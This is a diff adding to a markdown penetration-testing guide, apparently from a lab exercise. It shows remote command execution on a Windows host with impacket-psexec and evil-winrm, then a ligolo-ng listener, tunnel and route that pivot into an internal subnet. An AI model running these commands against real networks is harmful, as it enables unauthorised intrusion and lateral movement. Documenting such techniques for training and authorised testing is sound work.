@@ -803,24 +803,66 @@ sudo chmod +x /usr/bin/impacket-psexec
 sudo chown user:user /usr/bin/impacket-psexec
 ```
 
--
+- Using impacket-exec-:
 
-- 
+```bash
+impacket-psexec [user]:[password]@172.16.5.19
+```
 
+![image](https://github.com/user-attachments/assets/b7b9230c-a1c6-4b96-aae7-e353d038ec90)
 
+- Or use evil-winrm-:
 
+```bash
+evil-winrm -i [ip] -u [user] -p [password]
+```
+![image](https://github.com/user-attachments/assets/d0f505ae-bde6-478f-8376-4370696576a8)
 
+- Uploading with evil-winrm
 
+![image](https://github.com/user-attachments/assets/d0882935-b995-4a26-8fc5-20f233b13ad1)
 
+- Knowing that the windows host cannot communicate directly with us, we’re going to setup a listener on the linux pivot using the listener_add command. This listener will redirect the traffic received by the linux host to our attacker machine.
 
+```ligolo-ng
+listener_add --addr [pivot-host which is the host that got compromised at first]:8001 --to 0.0.0.0:8001
+```
+![image](https://github.com/user-attachments/assets/367a6b24-95fb-4713-b880-ad4664b361cb)
 
+- File transfer on host `5.19`
 
+![image](https://github.com/user-attachments/assets/b8145236-774a-4fb6-b8ac-938f20508bfc)
 
+- You need to also create another listener to connect to ligolo on port `11601`-:
 
+![image](https://github.com/user-attachments/assets/9549a172-b08d-4c20-b274-fd43720b1375)
 
+- Now connect-:
 
+![image](https://github.com/user-attachments/assets/d47504ce-2d3a-4bc4-ab93-6cbcd7877a17)
 
+- Use session 2 with `session` by using arrow keys-:
 
+![image](https://github.com/user-attachments/assets/a0f1a0ad-9a20-4436-a71a-959ba9b95fea)
+
+- Access to host on route `172.16.6.*`
+
+![image](https://github.com/user-attachments/assets/27f38ba5-bbbe-4a90-af44-14c0747de124)
+
+- Create a new interface and start a tunnel-:
+
+```ligolo-ng
+ifcreate --name ligolo1
+tunnel_start --tun ligolo1
+route_add --name ligolo1 --route 172.16.6.0/24
+```
+- Removing a route-:
+
+```bash
+sudo ip route del 172.16.0.0/16 dev ligolo
+```
+
+![image](https://github.com/user-attachments/assets/d7294671-82ce-44c3-95aa-42440102fca3)
 
 
 
